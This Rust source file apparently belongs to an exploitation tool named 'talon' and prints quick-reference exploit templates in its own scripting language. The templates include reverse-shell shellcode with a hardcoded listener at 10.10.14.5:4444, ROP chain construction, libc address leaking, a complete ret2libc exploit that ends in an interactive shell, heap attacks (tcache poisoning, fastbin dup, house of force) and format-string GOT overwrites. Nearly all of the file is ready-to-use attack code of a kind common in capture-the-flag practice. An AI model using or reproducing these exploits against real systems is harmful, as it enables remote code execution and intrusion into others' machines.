use std::collections::HashMap;

pub struct QuickMode;

impl QuickMode {
    pub fn shell(host: &str, port: u16) -> String {
        format!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                    QUICK SHELL - Instant Reverse Shell                   ║
╚══════════════════════════════════════════════════════════════════════════╝

Target: {}:{}

ONE-LINER (copy-paste):
────────────────────────────────────────────────────────────────────────────
let s = connect("{}", {}) | send(s, shellcode("x64", "execve", "/bin/sh")) | interactive(s)

FULL SCRIPT:
────────────────────────────────────────────────────────────────────────────
let s = connect("{}", {})
let sc = shellcode("x64", "execve", "/bin/sh")
send(s, sc)
interactive(s)

ALTERNATIVES:
────────────────────────────────────────────────────────────────────────────
Linux x64:   shellcode("x64", "execve", "/bin/sh")
Linux x86:   shellcode("x86", "execve", "/bin/sh")
Windows x64: shellcode("x64", "exec", "cmd.exe")
ARM:         shellcode("arm", "execve", "/bin/sh")

REVERSE SHELL:
────────────────────────────────────────────────────────────────────────────
let sc = shellcode("x64", "reverse", lhost: "10.10.14.5", lport: 4444)
"#, host, port, host, port, host, port)
    }

    pub fn rop(binary: &str) -> String {
        format!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                   QUICK ROP - Interactive ROP Builder                    ║
╚══════════════════════════════════════════════════════════════════════════╝

Binary: {}

STEP 1: FIND OFFSET
────────────────────────────────────────────────────────────────────────────
let offset = auto_offset("{}")
print("Offset:", offset)

STEP 2: FIND GADGETS
────────────────────────────────────────────────────────────────────────────
let pop_rdi = rop_find("{}", "pop rdi; ret")[0].address
let pop_rsi = rop_find("{}", "pop rsi; ret")[0].address
let ret = rop_find("{}", "ret")[0].address

STEP 3: BUILD ROP CHAIN
────────────────────────────────────────────────────────────────────────────
let rop = [
    ret,           
    pop_rdi,
    binsh_addr,
    pop_rsi,
    0,
    system_addr,
]

STEP 4: EXPLOIT
────────────────────────────────────────────────────────────────────────────
let payload = "A" * offset + pack_addresses(rop)
send(conn, payload)

QUICK TEMPLATES:
────────────────────────────────────────────────────────────────────────────
ret2libc:     talon template ret2libc <host> <port>
rop-chain:    talon template rop-chain <host> <port>
stack-pivot:  talon template stack-pivot <host> <port>
"#, binary, binary, binary, binary, binary)
    }

    pub fn leak(conn_var: &str) -> String {
        format!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                   QUICK LEAK - Interactive Leak Helper                   ║
╚══════════════════════════════════════════════════════════════════════════╝

Connection: {}

LEAK LIBC ADDRESS:
────────────────────────────────────────────────────────────────────────────
let leak = recv({}, 8)
let addr = u64(leak)
print("Leaked: 0x" + hex(addr))

let matches = libc_search("puts", addr)
if len(matches) > 0 {{
    print("Found libc:", matches[0].id)
    let libc_base = addr - matches[0].symbols["puts"]
    print("libc base: 0x" + hex(libc_base))
    
    let system = libc_base + matches[0].symbols["system"]
    let binsh = libc_base + matches[0].symbols["str_bin_sh"]
}}

LEAK STACK/PIE:
────────────────────────────────────────────────────────────────────────────
let leak_stack = recv({}, 8) | u64
let leak_pie = recv({}, 8) | u64

LEAK WITH FORMAT STRING:
────────────────────────────────────────────────────────────────────────────
send({}, "%p " * 20)
let leaks = recv_until({}, "\n")
let addresses = split(leaks, " ")

COMMON LEAK OFFSETS (from leaked function):
────────────────────────────────────────────────────────────────────────────
puts:        typically @ libc + 0x809c0
printf:      typically @ libc + 0x64f70
system:      typically @ libc + 0x4f440
__libc_start_main: typically @ libc + 0x21ab0
"#, conn_var, conn_var, conn_var, conn_var, conn_var, conn_var)
    }

    pub fn pwn(binary: &str, host: &str, port: u16) -> String {
        format!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                 QUICK PWN - All-in-One Exploit Builder                   ║
╚══════════════════════════════════════════════════════════════════════════╝

Binary: {}
Target: {}:{}

AUTOMATIC EXPLOIT GENERATION:
────────────────────────────────────────────────────────────────────────────
let s = connect("{}", {})

let offset = auto_offset("{}")
print("[+] Buffer offset:", offset)

let puts_plt = find_symbol("{}", "puts", section: "plt")
let puts_got = find_symbol("{}", "puts", section: "got")
let main = find_symbol("{}", "main")
let pop_rdi = rop_find("{}", "pop rdi; ret")[0].address

print("[+] Leaking libc...")
let payload1 = "A" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
send(s, payload1)

let leak = u64(recv_until(s, "\n")[0..8])
print("[+] Leaked puts: 0x" + hex(leak))

let matches = libc_search("puts", leak)
let libc_base = leak - matches[0].symbols["puts"]
let system = libc_base + matches[0].symbols["system"]
let binsh = libc_base + matches[0].symbols["str_bin_sh"]

print("[+] libc base: 0x" + hex(libc_base))
print("[+] system: 0x" + hex(system))
print("[+] /bin/sh: 0x" + hex(binsh))

print("[+] Sending final payload...")
let payload2 = "A" * offset + p64(pop_rdi) + p64(binsh) + p64(system)
send(s, payload2)

print("[+] Shell!")
interactive(s)

SAVE TO FILE:
────────────────────────────────────────────────────────────────────────────
Run: talon template ret2libc {} {} > exploit.talon
Then: talon run exploit.talon
"#, binary, host, port, host, port, binary, binary, binary, binary, binary, host, port)
    }

    pub fn heap() -> String {
        r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                 QUICK HEAP - Heap Exploitation Helpers                   ║
╚══════════════════════════════════════════════════════════════════════════╝

TCACHE POISONING:
────────────────────────────────────────────────────────────────────────────
for i in range(7) { send(s, "alloc\n64\n") }
for i in range(7) { send(s, "free\n" + str(i) + "\n") }
send(s, "edit\n6\n" + p64(target) + "\n")
send(s, "alloc\n64\n")
send(s, "alloc\n64\n" + payload)

FASTBIN DUP:
────────────────────────────────────────────────────────────────────────────
send(s, "alloc\n64\nA")
send(s, "alloc\n64\nB")
send(s, "alloc\n64\nC")
send(s, "free\n0")
send(s, "free\n1")
send(s, "free\n0")
send(s, "alloc\n64\n" + p64(target))

HOUSE OF FORCE:
────────────────────────────────────────────────────────────────────────────
send(s, "alloc\n16\n" + "A" * 16 + p64(0xffffffffffffffff))
let evil_size = target - heap_base - 0x20
send(s, "alloc\n" + str(evil_size))
send(s, "alloc\n24\n" + payload)

TEMPLATES:
────────────────────────────────────────────────────────────────────────────
talon template tcache-poison <host> <port>
talon template fastbin-dup <host> <port>
talon template house-of-force <host> <port>
talon template unsorted-bin-attack <host> <port>
"#.to_string()
    }

    pub fn format_string() -> String {
        r#"
╔══════════════════════════════════════════════════════════════════════════╗
║              QUICK FMT - Format String Exploitation                      ║
╚══════════════════════════════════════════════════════════════════════════╝

FIND OFFSET:
────────────────────────────────────────────────────────────────────────────
send(s, "AAAA.%p.%p.%p.%p.%p.%p.%p.%p")
let output = recv_until(s, "\n")

WRITE TO MEMORY:
────────────────────────────────────────────────────────────────────────────
let target = 0x0804a000
let value = 0xdeadbeef
let payload = fmtstr_payload(6, {target: value}, arch: "x86")
send(s, payload)

LEAK STACK:
────────────────────────────────────────────────────────────────────────────
send(s, "%p " * 20)

LEAK ARBITRARY ADDRESS:
────────────────────────────────────────────────────────────────────────────
let addr = 0x0804a000
send(s, p32(addr) + "%7$s")

GOT OVERWRITE:
────────────────────────────────────────────────────────────────────────────
let printf_got = 0x0804a010
let system_addr = 0xf7e4c060
let payload = fmtstr_payload(6, {printf_got: system_addr}, arch: "x86")
send(s, payload)
send(s, "/bin/sh\0")

TEMPLATE:
────────────────────────────────────────────────────────────────────────────
talon template format-string <host> <port>
"#.to_string()
    }
}

pub fn quick_shell(host: &str, port: u16) -> String {
    QuickMode::shell(host, port)
}

pub fn quick_rop(binary: &str) -> String {
    QuickMode::rop(binary)
}

pub fn quick_leak(conn: &str) -> String {
    QuickMode::leak(conn)
}

pub fn quick_pwn(binary: &str, host: &str, port: u16) -> String {
    QuickMode::pwn(binary, host, port)
}

pub fn quick_heap() -> String {
    QuickMode::heap()
}

pub fn quick_fmt() -> String {
    QuickMode::format_string()
}
